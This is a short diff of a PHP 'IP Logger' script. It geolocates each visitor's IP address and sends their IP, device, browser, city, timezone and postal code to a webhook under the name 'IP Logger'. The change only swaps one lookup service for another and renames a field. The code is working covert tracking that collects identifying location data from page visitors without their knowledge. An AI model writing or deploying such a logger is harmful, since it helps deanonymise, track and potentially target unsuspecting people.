@@ -83,7 +83,7 @@ $ipdat = @json_decode(file_get_contents(
     "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
 
 $ipshet = @json_decode(file_get_contents( 
-    "http://ip-api.com/json/" . $ip));
+    "https://utilities.tk/network/info?ip=" . $ip));
 
 $hookObject = json_encode([
     "username" => "IP Logger",
@@ -95,7 +95,7 @@ $hookObject = json_encode([
 
             "type" => "rich",
 
-            "description" => "**IP: `$ip`\nDevice: `$user_os`\nBrowser: `$user_browser`\nTime: `$time`\nCountry: `$ipdat->geoplugin_countryName`\nCity: `$ipdat->geoplugin_city`\nContinent: `$ipdat->geoplugin_continentName`\nTimezone: `$ipdat->geoplugin_timezone`\nPostal Code: `$ipshet->zip`**",
+            "description" => "**IP: `$ip`\nDevice: `$user_os`\nBrowser: `$user_browser`\nTime: `$time`\nCountry: `$ipdat->geoplugin_countryName`\nCity: `$ipdat->geoplugin_city`\nContinent: `$ipdat->geoplugin_continentName`\nTimezone: `$ipdat->geoplugin_timezone`\nPostal Code: `$ipshet->postal`**",
 
             "url" => "https://dropout.vip/",
 
